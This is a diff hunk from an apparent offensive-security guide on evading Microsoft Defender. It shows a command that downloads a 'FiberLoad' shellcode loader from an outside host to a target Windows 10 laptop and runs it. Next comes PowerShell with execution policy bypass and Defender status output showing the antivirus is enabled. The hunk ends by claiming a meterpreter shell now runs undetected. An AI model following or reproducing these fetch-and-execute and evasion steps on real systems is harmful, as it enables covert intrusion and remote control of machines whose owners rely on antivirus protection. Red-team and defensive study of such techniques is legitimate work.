@@ -40,8 +40,38 @@ Only the shellcode loaders (for x64 shellcodes) generated with the following loa
 Step 3 - Download and execute the shellcode loader on a target Windows 10 laptop (with the MS Defender Antivirus enabled & up-to-date)
 ---------------------------------------------------------------------------------------------------------------------------------------
 
+Note: for this example I used the shellcode loader using the loading method "Fiber Load".
+
 C:\Users\Administrator\Downloads> wget -URI http://X.X.X.X/FiberLoad-loader.exe -OutFile FiberLoad-loader.exe 
+
 C:\Users\Administrator\Downloads> FiberLoad-loader.exe 
+
+C:\Users\Administrator\Downloads> powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator\Downloads> Get-MpComputerStatus
+
+AMEngineVersion                  : 1.1.19900.2
+AMProductVersion                 : 4.18.2211.5
+AMRunningMode                    : Normal
+AMServiceEnabled                 : True
+AMServiceVersion                 : 4.18.2211.5
+AntispywareEnabled               : True
+AntispywareSignatureAge          : 0
+AntispywareSignatureLastUpdated  : 19/12/2022 21:49:56
+AntispywareSignatureVersion      : 1.381.747.0
+AntivirusEnabled                 : True
+AntivirusSignatureAge            : 0
+AntivirusSignatureLastUpdated    : 19/12/2022 21:49:55
+AntivirusSignatureVersion        : 1.381.747.0
+BehaviorMonitorEnabled           : True
+ComputerID                       : E70605CF-4FB8-4F78-B259-E84DC9486FBF
+ComputerState                    : 0
+DefenderSignaturesOutOfDate      : False
+<SNIP>
 
 
 Step 4 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
